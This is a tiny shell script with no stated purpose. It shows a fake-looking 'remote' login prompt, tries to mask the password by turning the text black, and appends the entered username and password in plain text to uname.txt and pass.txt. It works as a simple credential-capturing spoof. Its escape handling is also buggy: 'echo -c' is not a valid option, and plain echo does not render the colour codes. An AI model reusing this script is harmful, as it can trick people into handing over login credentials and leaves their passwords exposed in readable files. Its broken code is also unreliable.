clear
echo 'Enter remote username: '
read uname; clear
echo 'Enter remote password: \e[30m'
read pword; echo -c '\e[m';clear;
echo $uname >> uname.txt
echo $pword >> pass.txt
#EOF